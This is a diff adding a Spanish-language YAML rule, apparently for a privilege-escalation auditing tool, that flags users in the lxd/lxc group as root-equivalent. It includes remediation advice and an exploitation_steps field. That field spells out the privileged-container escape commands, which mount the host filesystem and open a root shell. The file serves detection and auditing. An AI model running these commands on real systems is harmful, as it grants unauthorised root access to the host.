@@ -1,0 +1,37 @@
+id: lxd-group
+title: "Miembro del grupo lxd / lxc"
+category: containers
+vector: lxd
+severity: critical
+tier: A
+reaches_root: true
+validator: from_validation
+validation_hint: lxd-group
+
+match:
+  any:
+    - path: lxd.usable
+      truthy: true
+    - path: lxd.in_lxd_group
+      truthy: true
+
+params:
+  hint: lxd-group
+
+step: "{user} está en el grupo lxd -> lanzar un contenedor privilegiado con el disco del host montado = root."
+
+exploitation_steps: |
+  NO ejecutado por el motor (Tier B). Escape estándar:
+     lxc init <imagen> escape -c security.privileged=true
+     lxc config device add escape host disk source=/ path=/mnt/root recursive=true
+     lxc start escape && lxc exec escape /bin/sh
+  Dentro del contenedor, /mnt/root es el filesystem del host con acceso root.
+  Si no hay imágenes locales, se puede importar una imagen mínima construida a mano
+  (sin descargas externas).
+
+remediation: |
+  Quitar usuarios del grupo `lxd`/`lxc` (root-equivalente). Si necesitan gestionar
+  contenedores, usar proyectos LXD con restricciones y `security.privileged=false`.
+
+references:
+  - https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html
